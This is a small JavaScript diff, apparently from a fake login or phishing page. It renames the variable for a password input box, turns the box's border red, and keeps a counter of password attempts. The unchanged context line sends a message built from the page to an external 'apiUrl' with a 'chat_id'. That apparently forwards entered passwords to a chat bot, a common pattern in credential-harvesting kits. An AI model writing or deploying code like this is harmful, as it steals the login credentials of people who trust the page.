@@ -30,9 +30,9 @@
 
                 PasswortInputCounter++;
                 
-                var meineInputbox = document.getElementById("passwordinput");
-                meineInputbox.style.borderColor = "red";
-                meineInputbox.style.border = "2px solid red"
+                var InputBoxPasswort = document.getElementById("passwordinput");
+                InputBoxPasswort.style.borderColor = "red";
+                InputBoxPasswort.style.border = "2px solid red"
 
 
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
